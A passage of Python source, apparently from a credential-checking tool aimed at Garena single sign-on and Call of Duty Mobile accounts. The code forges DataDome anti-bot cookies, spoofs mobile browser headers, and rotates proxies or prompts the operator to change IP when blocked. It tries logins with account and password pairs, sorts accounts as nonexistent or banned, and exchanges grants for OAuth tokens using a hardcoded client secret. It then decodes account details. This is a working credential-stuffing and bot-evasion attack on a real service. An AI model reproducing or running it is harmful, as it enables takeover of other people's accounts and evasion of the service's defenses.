        'jspl': 'zwgLcdRyy5Xqt6Uqo8EpKO74yaRQlkfP1VfA2TDddNMm1ItkPvjSeJtfAnbvuZC3rvtdnw1VgDa222qqYSkpDGMZJcICkZoOCExn6LuBw44mE0VV0EsZi2HU9UGWL6E0qf0bZvL6YfoQNhi01OuquEGLtk1Sfh3zPnwH1B-KINRZATPqbcl8UqH10K_8Mzy5o0gIB_41T_mLm-PRCY7GT22ROOl4_vInwcLt9IzkzYCvYUPEsevPGy66Jn9NSqfxPH3eVY4WXSp8hsxuFkIWZ5EKr9BMYZUsbsvluxrLosSwWx1ZCvTeWf06VE7MWVSla31WniOMhsNzC7Zy7AcUfbdILZFwDu9uWPmw6-fibpRKjR9pt5-3anOWT_JUqzNOtkifagY8l9GqnSwmG0Pw6S8GIg6B-j8pSXIKY7rKveIlyBnufxYBFTWcG_J8_re8XG8-IvPYYpI48V17O_oeG9Kmjq_VOmccodp3GTxAOdcoNKTZBWjHpGq4FM0WUr-I7If9GTSfwnIR9Atn1tSLRH8FRlBWeUet5pDiCUO5mAc4Y4xJBba_xd1G9-i5ARwZaIfX7hGcgM53I6FVLXzB8yK_he32-c9LjBLXr3qhc9lSS9dKgHHdNGKN4M3zGx2n2cKLu4DwFn1IlKAwApKboca7Eg2NbWUwNMgwfiEpDXnwY9YqUQ_kcLHutZGsEeAO33cMl-ugR7LOzNBvnVkqY-_OiBKg3tFD6kOh_VzEcozYsqeUG1dA6yzgW507T19WtuZG_ut9ovdyLSvykEurbReZfXIHBo6MK3bBLomlIPJDY9rwdTtQ7kmu9TUHomsZy13f5FKrgOuujypljkXvFWXPS-jtRf0S6T0fV2L4lcX5CFqDpzTiE2dDHybOL8tKhk6Sb8ywXfezTWFIGWd6InMLxRIbR-A7qCdyTql3ON8Mc0-yg_lAnMOjeeSZjIuSScux-Bir-JQhZSWLOo5Yx8uRYSNlYignFfQHc7ymrjC4LvxK2EPphwugh74y-J1mTkL-8ybX46Hm5fkhTXlVFXfF3_z3a0vAs2pzCxNqRCY8cY4iSe44VtG3lUUYkQ5xsLoY_ukuZDxxTlWdewhw2sGRoV7o_CtWuhmMxzJRp7EsVv8nMfDwpEOD6h_FPkeMx3jXY9oEpEBqopS_2dH4QS1pxn5msma4pgAVusVf0PzwBRnHp_0PJ1NqVXWS-eC_tg6cFKSNxDNZ5sFYfbVYNCevnM23NHgdJcS5c25G14jxNNZWm5rbWxX6s5GL6R-YBge85EMBlrTYOexq5wNXz93tw02jLnR_IQRTP32L32jLZDjRHOmDOLKdqcF-8DJU2nKXlWbkRf3f0mGWKe8rk_MhDwCcC3u3yFWWNkLqOUYxoOVMfVlCFBexCrCk1hxn_rx5x0tNWGOtfbNUQmoKOKF-5o8m-1NkgRy599T0ktZQuJ_WvG4mjn1sRb6eDz7pspYBU-FN3rMjdJUG5IahAYIb4uJ-_GUMkussvsJfA6ClZXnlGVSEZtMPlfUu7Qh_7KA3ZfpVosY5GUWEA84ujEXQLNCfQvflaLt3qclF_VQyCva9VmJAY0oRz6Ry9k1knaUqB8EVEeCSSJ9qXLMK4IodyHl0KYTkZrA58id3xSqei-htpI6J0oCixYNWDR7LKrQtBX_BRnsnfxFmoHnef3Mq2hPo5NQ_UFoLUAm8Mnk5gRHmb1VnfQCCkX4fF3e5ZghNOxJAqVamIJNrBLaxmaJh5N9q2rNK7YFgLb66vXU-IrnD2KsBtSzt4X4scyT-s5K36EhraMr5IB3vwrwv8HAtK-RQflU1yXsrZ_JqutEMN9OARoFdbBWTC3vbEzy2Y-2WUwtYTrNACq5fQB92FbbGiJwdzfSYgMq-7PeJldTFbQgDTpY4VJTGXbW-IX9Zd57_yX4PoaQUYtLHB81u8Ip8Nhd4tt7E46adINkPncFrNIXzMQ8kR6CaHAQXY1H1j0TknSj7z8OduFh0fYQ2UI_DzpDu28VV8fpo0Rgkm2xJKQFS9fidJhnNBt2toL5pLVwaN8cTQNjPxMGKFNT8F0UjaHoIKOgWa-WyvPGUpuoMgkpyVhsMpdhoiGgvgDIE0k97CcD6BhXpjWZBF5ZAqoWdfq3CpH80OxPk-V9TZDFUUVCYXq0rQClV77DJrjAckJeDLpnMNlPI3Zkm_ife8ZexOOVeHPqqIq_0FfsuZVTaFAb44vWEYIgSTbSfgZid-xQX5DDAaIHZHZEDTL5NWQajEQ15z37CMn5lJ2lX4Cs4RGuiorkPKP0OIxnW-FSwjP_IamNCg6REc31J8rOTig9YAVVFbt6ygOYEcegwGhpIvrFoNYTfiyIXlB_U1R9eGgEPinsPaSXYRcpo3C02M26tAxo9wWTNk8q36k4WnsiZztGXHvfqTiSuJw66Q48BQFrC9IPLJsodBomUXG-6YGv6l1p9mXdkDC0WroHGWbXuhaEaMEbe0PlWxoNrj1wg3H1vQr3i8V-Sh0W2tHqImD1tXRbWpmXRaFUnRbOyIz6NdXJpj81r-XbdQqM08q6hhykt6hfIjndXvpL3-Dfqr3rk50T9A1Aa3rEkZnwWB0_GP_3KLqeYKeA2789NcnZAuDHx_WK5HPbAoMMy8bD32Lr6dEfoEThcNvQdftTGdjFqyrBLWw9MW9npyuzp2Xmq-Bewwq5c_S7oY-GM8_-0YrVI3PZaNkXcqF5aK0mHmFYsyEhOxOxMHNgV-9qX7s708U0cYh7gVYLiuTfBiLyd-QbeUP9xTYWTps-r2SXIHAXuQuKAhjDdhv-BBlxWPK2lmD4ba5gyOI94-ygTRcUvMBJvS74Mpj2uMtyHYdlRyj-t9-NRCb1ipX3QL7F5tMaZ6G7jbCXTnihtF-9P8108zHtZteKOXtOLxxeQPdp4ogf7h_T7kol9eincbEksi_BVqZa1j6LdZG1N-keFeUHJM8scCCXyP0A9TsrRlUkrMzYKfCjUEluNCv_V-hen0FZggr5ob39HkYsWHD0GVIBz8CnMsYAeBKzqWk3LaG-o2L8u_aHF8SoS_JAhxi8gM-t8GBHTMEBoZPqpv1hPXfmlGzWcMBEHCOt8y9ghazrHRI-UR86Himsrxi-B478rpT9w4jpfUBUpNWYz5wemQCleeD1fivWkko_eGYFc_Ygjf2YMus3tgeaDMCza1m7rl7ib8c-xJUO55F-_YSif10RTJc-JV5JU3PXTwhem92CpaDO9UWmfm8yQ8I33X8NpAtGiw7-RETvaIcKC7nhyql35FZkKcIoPT2qLw7GrHYYb8iKXg4NUN87hxWsueBAeYPySpU9Por7KFc-yzMpRP5s0AyhMjhFUbm4ujlajWK6Fi0xwannuNfkz8dsAUzgaNz9M22Ot2yieiLA24_j8R1ZYItCeB8xQlJO-fFis0gM7eshNU7b9zaDtvdvQivn0davJmFkrsTU1PIGB0Cs0rDKIf3QF1GG0BPbhGQTx16tsc8kiBzj2eBVok5MxdyG2Hw4NcMS-Dnclih6P80Sro2R-NbP-LbZ1VbwBQvrVRVEPUFUocfdHpTXRppoICMRMSrggaaZ3YXWLARUdYDUaWpBdnMw64dB6VsGKkFSwMXOr87bgx_0GKljT8tIsdt34OqZKq2rA-Ac4ob4-u5X5t5v9YqU2d1Bc5dvQX8qIsbgLqzPDjl_-ZSHtZJ8dR4Yx-Yat0H8a46ta2LlCs8HsN0j8XyU3M2SZf-qKOdbGsssee-q39z7DvWYVJdIlBSwhyZlz2o69t5TIDoK47pTbos7_F66Gs3b2LcmZHUMSkPbuUvRnfGV3Y8k54jnCdqRPj2t1t1VCvJJ-t9fJpCikcj-vVJ6jYo1c5VDK5_TMlXUvwKR_CktDHxiNRQhC1Sw5OUfdenZNcB6LzCsoPkqO_7P9JY0k_lA58rx_gLOnpA-zU_KpueQLLve09GqBrgyV4EeGURIXspUYZ8oYDaE6FdEGWTlmaphrybHOU2_rX7mm90ltPgPCM_CWHN2e5E5sl2vtlaGm_jjZ_9Luq4rG4yWENFif82npAntCni5eourA5sfzIIDzA9WDxHpG-EzKfqTepszHTOPLLWprSQu9L5fkcXcFDpLnUF4HwnmaPJPcDUCy-ZOeYxqvRzhmu9v-Zbgtjok1wnkuh9zxsdHoo6fxeExR46YkoFNuF2DN35t7Z_a7ucPJSLlj5bQKHtJ5-UXy-ubJigYstLtBQ695zw-jK4fdDlHDKXDWRq8heMuGYl3T_pwt9gMGjNmOFt9AjGj_GknpukPN0_4z0XNQm7Ss0Y2wJDKMKsm38iXmWkvRBk1U6-sZYY2ZWoJlOSv-RKR8p9xvOkFU8NN0e1v1-rnaSrD50YEZOi5TCNhpRXjPuOgfOr5J_XdoRj2wliTdT0IuLGsEIl27KrvSIBANQ1rrGKIwBYiYNlZ6cs6zOOxB1VWsAvrIUrVfiGY5OrwK_tZTwsWxUiRUJPTloQggsM8cZjvqOknhyYY1zQJ9lx28J5dHDyNq4yu2CZeM4AOPjWdwvSmXkXJ1ucEOThcII1W5OG8ZFdlruQQ7zN6z7n-PNRxAY0iij54HcNyIvyAjvSHeHrqnGndJywhJdGHMpsqBSi9noCKaI6Bms2WGq_krShPxTfB4nmezQnUdulPpwGy4nv1Wk4rLosbXUNbG7Xd4Ex3fsptLXCdZnpbuSsICq_6YJ9yXhLj_5GKze2bVPVGo4HoiUGJpPzyXVaN_KR22Xz9RhWQKlSdwagCyj8y7-UJiSw1QfV4CVpJGN5XkxGCD4NKinFpN9tXxwRmLEhdS99AP5jEqVX70aqD2gWhrLUhsf7mb_4Rb0aTPQe10cpbsaxxuoEUvsAwBKJ8U8iF-v2zbPhJL6KTzGZ4ITqbd4AIpE0GAzUGyReiUDLYd_NZOAKI17yPHHLr5uWjXXeiHemirVZHLVht7WUAe_1SySy8PzsVaeEREwSJSZ_9dnk6F46iDW9FmmEMHmgV3dSvgu3WSoxTYcQ_9OPqjTqe6GB-0lHsjJJh4ezaBb6EVJ4ZLRXWPbOAqc-g5uYZQYPW2xoLvThEHK4e48IvADGqqaJQpDh9uTM41cwEuU5gRqNujSZttGKfwz9ensAPp5DP0-26T-vvRkJ6Zt49ayXn3-u1K8rgDl8O9ypiSeYexGU-0dEmkUuI93nxwE7puB4NV8E_cJMiOqDQSwhlAKlvlL_klJLg-pOG9DSF7bq8ekSqDnrrQ-wrH9t5GQXYVFAmXWZC9lFx5L8zDXescD1-tw4A8hX6qEyYGDH0NmnPCFRVAkH0_u0Fn6wIZxp',
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'b0Ntvzc4jCM_LR~Mx53eF4tvU17AAtMWcSa2~Yst1aJh54otyI8Agm3m7JGN1gtXukt5ha538bVkDyGwz0KiG~RdJm8mq2kklT451ap1tysBstWeU1z6PjFxWRyLG6Ly',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=id-ID',
        'request': '/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=id-ID',
        'responsePage': 'origin',
        'ddv': '5.9.0'
    }

    try:
        response = session.post(url, headers=headers, data=payload, proxies=proxies, timeout=5)
        
        if response.status_code == 200:
            try:
                data = response.json()
                cookie_value = data.get('cookie') or data.get('cookieValue')
                if cookie_value:
                    return cookie_value
            except Exception:
                pass
            
            if 'datadome' in response.cookies:
                return response.cookies['datadome']
                
        elif response.status_code == 403:
            print("[Datadome] IP or challenge blocked (403 Forbidden)")
        elif response.status_code == 429:
            print("[Datadome] Rate limited (429 Too Many Requests)")
        else:
            print(f"[Datadome] Unexpected status code: {response.status_code}")
            
    except Exception as e:
        print(f"[Datadome] Exception occurred while fetching cookie: {e}")
        
    return None


class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        global _ip_wait_lock, _ip_wait_active, _ip_wait_event
        with _ip_wait_lock:
            if _ip_wait_active:
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_event.clear()
                is_primary = True
        if not is_primary:
            _ip_wait_event.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not _suppress_ip_prints:
                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if _ip_block_callback:
                    _ip_block_callback(True)
                time.sleep(10)
                if _ip_block_callback:
                    _ip_block_callback(False)
                return True
            if not _suppress_ip_prints:
                _log('ERROR', f'IP BLOCKED — {original_ip}')
                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if _ip_block_callback:
                _ip_block_callback(True)
            start_time = time.time()
            if not _suppress_ip_prints:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        _log('SUCCESS', f'IP changed: {original_ip} → {current_ip}')
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                _log('ERROR', 'IP did not change within time limit')
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
            else:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_wait_event.set()

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

def prelogin(session, account, datadome_manager, cookie_manager, retries=3, proxy_manager=None):
    all_403 = True
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {
                'app_id': '10100', 
                'account': account, 
                'format': 'json', 
                'id': str(int(time.time() * 1000))
            }
            
            # Match the exact cookies and structure from your working request
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            cookie_names = [
                'apple_state_key', 'datadome', 'sso_key', '_ga', 
                '_ga_KE3SY7MRSD', '_ga_RF9R6YT614', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'
            ]
            for cookie_name in cookie_names:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'host': 'sso.garena.com',
                'connection': 'keep-alive',
                'sec-ch-ua-platform': '"Android"',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
                'sec-ch-ua-mobile': '?1',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=id-ID',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
                
            response = session.get(url, headers=headers, params=params, timeout=3)
            
            if response.status_code == 403:
                proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                else:
                    datadome_manager.handle_403(session)
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                all_403 = True
                break
                
            if response.status_code == 429:
                all_403 = False
                time.sleep(3)
                continue
                
            response.raise_for_status()
            all_403 = False
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return (None, None, None)
                
            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get('datadome')
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                
            if 'error' in data:
                return (None, None, new_datadome)
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                return (None, None, new_datadome)
                
            return (v1, v2, new_datadome)
            
        except requests.exceptions.ConnectionError:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except requests.exceptions.Timeout:
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
        except Exception:
            all_403 = False
            if attempt < retries - 1:
                time.sleep(1)
                continue
                
    if all_403:
        return ('IP_BLOCKED', None, None)
    return (None, None, None)



def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100', 
        'account': account, 
        'password': hashed_password, 
        'redirect_uri': 'https://account.garena.com/', 
        'format': 'json', 
        'id': str(int(time.time() * 1000))
    }
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    cookie_names = [
        'apple_state_key', 'datadome', 'sso_key', '_ga', 
        '_ga_KE3SY7MRSD', '_ga_RF9R6YT614', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'
    ]
    for cookie_name in cookie_names:
        if cookie_name in current_cookies:
            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    # Match exact headers from your captured login request stream (Chrome 151)
    headers = {
        'host': 'sso.garena.com',
        'connection': 'keep-alive',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json, text/plain, */*',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        'sec-ch-ua-mobile': '?1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=id-ID',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8'
    }
    
    if cookie_header:
        headers['cookie'] = cookie_header
        
    retries = 5
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=3)
            response.raise_for_status()
            
            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass
                            
            try:
                for k, v in response.cookies.get_dict().items():
                    if k not in login_cookies:
                        login_cookies[k] = v
            except Exception:
                pass
                
            for k, v in login_cookies.items():
                if k in ['sso_key', 'apple_state_key', 'datadome']:
                    session.cookies.set(k, v, domain='.garena.com')
                    
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None
                
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                    return f'permanent_fail:{error_msg}'
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None
            return sso_key
            
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(0.5)
                continue
    return None


def _generate_device_id():
    import uuid
    return f'02-{uuid.uuid4()}'

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {
                'Host': '100082.connect.garena.com',
                'Connection': 'keep-alive',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)',
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'Origin': 'https://100082.connect.garena.com',
                'X-Requested-With': 'com.garena.game.codm',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9'
            }
            if cookie_header:
                grant_headers['Cookie'] = cookie_header
            grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
            resp.raise_for_status()
            data = resp.json()
            code = data.get('code', '')
            if not code:
                logger.error(f'[ERROR] token/grant returned no code: {data}')
            return code
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in get_codm_grant_code (token/grant)')
            return ''
    return ''

def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = None
    CLIENT_ID = '100082'
    CLIENT_SECRET = '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
    REDIRECT_URI = 'gop100082://auth/'
    exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
    exchange_headers = {
        'User-Agent': 'GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': '100082.connect.garena.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12, proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get('access_token', '')
            if not access_token:
                logger.error(f'[ERROR] token/exchange returned no access_token: {data}')
            return access_token
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in token_exchange (token/exchange)')
            return ''
    return ''

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        import uuid
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
            'referer': 'https://auth.garena.com/'
        }
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'referer': 'https://100082.connect.garena.com/',
            'x-requested-with': 'com.garena.game.codm'
        }
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        try:
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {
                        'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                        'codm_level': user_data.get('codm_level', 'N/A'),
                        'region': user_data.get('region', 'N/A'),
                        'uid': user_data.get('uid', 'N/A'),
                        'open_id': user_data.get('open_id', 'N/A'),
                        't_open_id': user_data.get('t_open_id', 'N/A')
                    }
        except Exception:
            pass
